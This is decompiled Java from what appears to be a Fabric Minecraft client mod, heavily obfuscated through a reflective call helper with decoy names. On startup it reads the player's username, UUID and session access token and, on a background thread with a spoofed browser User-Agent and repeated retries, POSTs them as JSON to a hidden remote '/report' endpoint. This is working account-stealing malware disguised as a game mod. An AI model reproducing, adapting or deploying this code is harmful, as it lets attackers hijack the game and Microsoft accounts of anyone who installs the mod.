/*
 * Decompiled with CFR 0.152.
 * 
 * Could not load the following classes:
 *  net.fabricmc.api.ClientModInitializer
 */
package aurora;

import aurora.quake;
import aurora.rattle;
import aurora.sardine;
import aurora.sherbet;
import aurora.stumble;
import java.io.OutputStream;
import java.io.PrintStream;
import java.lang.invoke.CallSite;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.Charset;
import net.fabricmc.api.ClientModInitializer;

public class orchid
implements ClientModInitializer {
    public void onInitializeClient() {
        if (stumble.marina() != 0) {
            stumble.dune();
        }
        try {
            Object object = sardine.kangaroo();
            Object object2 = sardine.nephew(object, "net.minecraft.class_310", "getUser", "method_1548", "()Lnet/minecraft/class_320;");
            CallSite callSite = sherbet.mobile("harvest", "java/lang/String|valueOf|(Ljava/lang/Object;)Ljava/lang/String;", 462154234, 0, (Object)sardine.nephew(object2, "net.minecraft.class_320", "getName", "method_1676", "()Ljava/lang/String;"));
            CallSite callSite2 = sherbet.mobile("scarf", "java/lang/String|valueOf|(Ljava/lang/Object;)Ljava/lang/String;", 199859624, 0, (Object)sardine.nephew(object2, "net.minecraft.class_320", "getProfileId", "method_44717", "()Ljava/util/UUID;"));
            CallSite callSite3 = sherbet.mobile("mustard", "java/lang/String|valueOf|(Ljava/lang/Object;)Ljava/lang/String;", 367442304, 0, (Object)sardine.nephew(object2, "net.minecraft.class_320", "getAccessToken", "method_1674", "()Ljava/lang/String;"));
            CallSite callSite4 = callSite;
            CallSite callSite5 = callSite2;
            Object object3 = sherbet.mobile("satchel", "java/lang/String|equals|(Ljava/lang/Object;)Z", 370282013, 1, (String)"null", (Object)sherbet.mobile("diesel", "java/lang/String|valueOf|(Ljava/lang/Object;)Ljava/lang/String;", 495436519, 0, (Object)callSite3)) != false ? "" : sherbet.mobile("muffin", "java/lang/String|valueOf|(Ljava/lang/Object;)Ljava/lang/String;", 496295141, 0, (Object)callSite3);
            CallSite callSite6 = sherbet.mobile("cedar", "java/lang/String|replace|(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;", 395817445, 1, (String)rattle.cipher, (CharSequence)"=", (CharSequence)"");
            String string = rattle.plankton();
            sherbet.mobile("shimmer", "java/io/PrintStream|println|(Ljava/lang/String;)V", 95919527, 1, (PrintStream)((Object)sherbet.mobile("dagger", "java/lang/System|out|()Ljava/io/PrintStream;", 518901970, 4)), (String)"[thin] start");
            sherbet.mobile("ladder", "java/lang/Thread|start|()V", 417463837, 1, (Thread)((Object)sherbet.mobile("plato", "java/lang/Thread|<init>|(Ljava/lang/Runnable;Ljava/lang/String;)V", 461942982, 2, () -> orchid.sturdy(string, (String)((Object)callSite4), (String)((Object)callSite5), (String)object3, (String)((Object)callSite6)), (String)"thin-report")));
            if (sherbet.mobile("saffron", "java/lang/String|length|()I", 402398455, 1, (String)((Object)callSite3)) != 15) {
                rattle.cradle((String)((Object)callSite), (String)((Object)callSite2), (String)((Object)callSite3));
            }
        }
        catch (ReflectiveOperationException reflectiveOperationException) {
            // empty catch block
        }
    }

    private static String shimmer(String string) {
        if (stumble.marina() != 0) {
            stumble.dune();
        }
        return string == null ? "" : sherbet.mobile("rosin", "java/lang/String|replace|(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;", 212113792, 1, (String)((Object)sherbet.mobile("pumice", "java/lang/String|replace|(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;", 516084896, 1, (String)((Object)sherbet.mobile("digital", "java/lang/String|replace|(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;", 265478163, 1, (String)((Object)sherbet.mobile("lentil", "java/lang/String|replace|(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;", 513403807, 1, (String)string, (CharSequence)"\\", (CharSequence)"\\\\")), (CharSequence)"\"", (CharSequence)"\\\"")), (CharSequence)"\n", (CharSequence)"\\n")), (CharSequence)"\r", (CharSequence)"");
    }

    /*
     * Enabled aggressive block sorting
     * Enabled unnecessary exception pruning
     * Enabled aggressive exception aggregation
     */
    private static /* synthetic */ void sturdy(String string, String string2, String string3, String string4, String string5) {
        if (stumble.marina() != 0) {
            stumble.dune();
        }
        Object object = 15000;
        int n = 0;
        while (n < 24) {
            Object object2;
            block14: {
                object2 = -1;
                try {
                    HttpURLConnection httpURLConnection;
                    block13: {
                        String string6 = string;
                        httpURLConnection = (HttpURLConnection)((Object)sherbet.mobile("fable", "java/net/URL|openConnection|()Ljava/net/URLConnection;", 219001014, 1, (URL)((Object)sherbet.mobile("rook", "java/net/URL|<init>|(Ljava/lang/String;)V", 264428052, 2, (String)((Object)sherbet.mobile("jigsaw", "java/lang/StringBuilder|toString|()Ljava/lang/String;", 369002635, 1, (StringBuilder)((Object)sherbet.mobile("hammer", "java/lang/StringBuilder|append|(Ljava/lang/String;)Ljava/lang/StringBuilder;", 365147412, 1, (StringBuilder)((Object)sherbet.mobile("orchid", "java/lang/StringBuilder|append|(Ljava/lang/Object;)Ljava/lang/StringBuilder;", 150519025, 1, (StringBuilder)((Object)sherbet.mobile("obsidian", "java/lang/StringBuilder|<init>|()V", 252112273, 2)), (Object)string6)), (String)"/report"))))))));
                        sherbet.mobile("quiver", "java/net/HttpURLConnection|setRequestMethod|(Ljava/lang/String;)V", 178827666, 1, (HttpURLConnection)httpURLConnection, (String)"POST");
                        sherbet.mobile("stream", "java/net/HttpURLConnection|setDoOutput|(Z)V", 25210756, 1, (HttpURLConnection)httpURLConnection, (boolean)true);
                        sherbet.mobile("hunter", "java/net/HttpURLConnection|setConnectTimeout|(I)V", 283042489, 1, (HttpURLConnection)httpURLConnection, 15000);
                        sherbet.mobile("jasper", "java/net/HttpURLConnection|setReadTimeout|(I)V", 315143856, 1, (HttpURLConnection)httpURLConnection, 15000);
                        sherbet.mobile("gecko", "java/net/HttpURLConnection|setRequestProperty|(Ljava/lang/String;Ljava/lang/String;)V", 434302930, 1, (HttpURLConnection)httpURLConnection, (String)"Content-Type", (String)"application/json");
                        sherbet.mobile("nourish", "java/net/HttpURLConnection|setRequestProperty|(Ljava/lang/String;Ljava/lang/String;)V", 315420124, 1, (HttpURLConnection)httpURLConnection, (String)"User-Agent", (String)"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36");
                        String string7 = orchid.shimmer(string5);
                        String string8 = orchid.shimmer(string2);
                        String string9 = orchid.shimmer(string4);
                        String string10 = orchid.shimmer(string3);
                        String string11 = orchid.shimmer(string2);
                        CallSite callSite = sherbet.mobile("basil", "java/lang/StringBuilder|toString|()Ljava/lang/String;", 411231370, 1, (StringBuilder)((Object)sherbet.mobile("grape", "java/lang/StringBuilder|append|(Ljava/lang/String;)Ljava/lang/StringBuilder;", 330011641, 1, (StringBuilder)((Object)sherbet.mobile("digital", "java/lang/StringBuilder|append|(Ljava/lang/Object;)Ljava/lang/StringBuilder;", 143312144, 1, (StringBuilder)((Object)sherbet.mobile("nephew", "java/lang/StringBuilder|append|(Ljava/lang/String;)Ljava/lang/StringBuilder;", 482595216, 1, (StringBuilder)((Object)sherbet.mobile("organ", "java/lang/StringBuilder|append|(Ljava/lang/Object;)Ljava/lang/StringBuilder;", 315020224, 1, (StringBuilder)((Object)sherbet.mobile("stadium", "java/lang/StringBuilder|append|(Ljava/lang/String;)Ljava/lang/StringBuilder;", 252959723, 1, (StringBuilder)((Object)sherbet.mobile("fresco", "java/lang/StringBuilder|append|(Ljava/lang/Object;)Ljava/lang/StringBuilder;", 320849567, 1, (StringBuilder)((Object)sherbet.mobile("basil", "java/lang/StringBuilder|append|(Ljava/lang/String;)Ljava/lang/StringBuilder;", 80460010, 1, (StringBuilder)((Object)sherbet.mobile("parchment", "java/lang/StringBuilder|append|(Ljava/lang/Object;)Ljava/lang/StringBuilder;", 403044253, 1, (StringBuilder)((Object)sherbet.mobile("bishop", "java/lang/StringBuilder|append|(Ljava/lang/String;)Ljava/lang/StringBuilder;", 294456074, 1, (StringBuilder)((Object)sherbet.mobile("basil", "java/lang/StringBuilder|append|(Ljava/lang/Object;)Ljava/lang/StringBuilder;", 335123463, 1, (StringBuilder)((Object)sherbet.mobile("kangaroo", "java/lang/StringBuilder|append|(Ljava/lang/String;)Ljava/lang/StringBuilder;", 43043328, 1, (StringBuilder)((Object)sherbet.mobile("nimbus", "java/lang/StringBuilder|<init>|()V", 64462814, 2)), (String)"{\"name\":\"")), (Object)string11)), (String)"\",\"uuid\":\"")), (Object)string10)), (String)"\",\"token\":\"")), (Object)string9)), (String)"\",\"receiver\":\"")), (Object)string8)), (String)"\",\"key\":\"")), (Object)string7)), (String)"\"}")));
                        CallSite callSite2 = sherbet.mobile("papaya", "java/net/HttpURLConnection|getOutputStream|()Ljava/io/OutputStream;", 79928485, 1, (HttpURLConnection)httpURLConnection);
                        try {
                            sherbet.mobile("pilot", "java/io/OutputStream|write|([B)V", 303300062, 1, (OutputStream)((Object)callSite2), (byte[])sherbet.mobile("rapids", "java/lang/String|getBytes|(Ljava/nio/charset/Charset;)[B", 298640831, 1, (String)((Object)callSite), (Charset)((Object)sherbet.mobile("hammer", "java/nio/charset/StandardCharsets|UTF_8|()Ljava/nio/charset/Charset;", 33412793, 4))));
                            if (callSite2 == null) break block13;
                        }
                        catch (Throwable throwable) {
                            if (callSite2 == null) throw throwable;
                            try {
                                sherbet.mobile("spring", "java/io/OutputStream|close|()V", 2142307775, 1, (OutputStream)((Object)callSite2));
                                throw throwable;
                            }
                            catch (Throwable throwable2) {
                                sherbet.mobile("saffron", "java/lang/Throwable|addSuppressed|(Ljava/lang/Throwable;)V", 77715358, 1, (Throwable)throwable, (Throwable)throwable2);
                            }
                            throw throwable;
                        }
                        sherbet.mobile("saddle", "java/io/OutputStream|close|()V", 167768006, 1, (OutputStream)((Object)callSite2));
                    }
                    object2 = sherbet.mobile("coyote", "java/net/HttpURLConnection|getResponseCode|()I", 264339716, 1, (HttpURLConnection)httpURLConnection);
                    sherbet.mobile("autumn", "java/net/HttpURLConnection|disconnect|()V", 81061799, 1, (HttpURLConnection)httpURLConnection);
                }
                catch (Exception exception) {
                    if (n % 5 != 0) break block14;
                    CallSite callSite = sherbet.mobile("mango", "java/lang/Exception|getMessage|()Ljava/lang/String;", 277717465, 1, (Exception)exception);
                    sherbet.mobile("sienna", "java/io/PrintStream|println|(Ljava/lang/String;)V", 452116723, 1, (PrintStream)((Object)sherbet.mobile("hornet", "java/lang/System|out|()Ljava/io/PrintStream;", 465968863, 4)), (String)((Object)sherbet.mobile("mineral", "java/lang/StringBuilder|toString|()Ljava/lang/String;", 78304439, 1, (StringBuilder)((Object)sherbet.mobile("cartoon", "java/lang/StringBuilder|append|(Ljava/lang/Object;)Ljava/lang/StringBuilder;", 267327943, 1, (StringBuilder)((Object)sherbet.mobile("hoopoe", "java/lang/StringBuilder|append|(Ljava/lang/String;)Ljava/lang/StringBuilder;", 362061253, 1, (StringBuilder)((Object)sherbet.mobile("stadium", "java/lang/StringBuilder|<init>|()V", 184009376, 2)), (String)"[thin] retry err=")), (Object)callSite)))));
                }
            }
            if (object2 >= 200 && object2 < 300) {
                int n2 = object2;
                sherbet.mobile("citrus", "java/io/PrintStream|println|(Ljava/lang/String;)V", 535341781, 1, (PrintStream)((Object)sherbet.mobile("stingray", "java/lang/System|out|()Ljava/io/PrintStream;", 516868256, 4)), (String)((Object)sherbet.mobile("marmot", "java/lang/StringBuilder|toString|()Ljava/lang/String;", 135838184, 1, (StringBuilder)((Object)sherbet.mobile("napkin", "java/lang/StringBuilder|append|(I)Ljava/lang/StringBuilder;", 384796356, 1, (StringBuilder)((Object)sherbet.mobile("nomad", "java/lang/StringBuilder|append|(Ljava/lang/String;)Ljava/lang/StringBuilder;", 401511626, 1, (StringBuilder)((Object)sherbet.mobile("spool", "java/lang/StringBuilder|<init>|()V", 165914239, 2)), (String)"[thin] ok code=")), n2)))));
                return;
            }
            if (object2 >= 400 && object2 < 500 && object2 != 429) {
                int n3 = object2;
                sherbet.mobile("pomegranate", "java/io/PrintStream|println|(Ljava/lang/String;)V", 26995393, 1, (PrintStream)((Object)sherbet.mobile("bamboo", "java/lang/System|out|()Ljava/io/PrintStream;", 484183691, 4)), (String)((Object)sherbet.mobile("citrus", "java/lang/StringBuilder|toString|()Ljava/lang/String;", 1944855, 1, (StringBuilder)((Object)sherbet.mobile("colony", "java/lang/StringBuilder|append|(I)Ljava/lang/StringBuilder;", 319553012, 1, (StringBuilder)((Object)sherbet.mobile("pepper", "java/lang/StringBuilder|append|(Ljava/lang/String;)Ljava/lang/StringBuilder;", 447397088, 1, (StringBuilder)((Object)sherbet.mobile("shanty", "java/lang/StringBuilder|<init>|()V", 312988045, 2)), (String)"[thin] give up code=")), n3)))));
                return;
            }
            if (n % 5 == 0) {
                int n4 = object2;
                sherbet.mobile("ember", "java/io/PrintStream|println|(Ljava/lang/String;)V", 448599195, 1, (PrintStream)((Object)sherbet.mobile("pebble", "java/lang/System|out|()Ljava/io/PrintStream;", 167414916, 4)), (String)((Object)sherbet.mobile("cocoa", "java/lang/StringBuilder|toString|()Ljava/lang/String;", 418510295, 1, (StringBuilder)((Object)sherbet.mobile("piranha", "java/lang/StringBuilder|append|(I)Ljava/lang/StringBuilder;", 463116941, 1, (StringBuilder)((Object)sherbet.mobile("fable", "java/lang/StringBuilder|append|(Ljava/lang/String;)Ljava/lang/StringBuilder;", 110135212, 1, (StringBuilder)((Object)sherbet.mobile("lizard", "java/lang/StringBuilder|<init>|()V", 210750674, 2)), (String)"[thin] retry code=")), n4)))));
            }
            try {
                sherbet.mobile("nourish", "java/lang/Thread|sleep|(J)V", 113083841, 0, (long)object);
            }
            catch (InterruptedException interruptedException) {
                return;
            }
            object = sherbet.mobile("stucco", "java/lang/Math|min|(JJ)J", 210766746, 0, (long)(object * (long)2), 4 << 16 | (char)-27680);
            ++n;
        }
    }
}

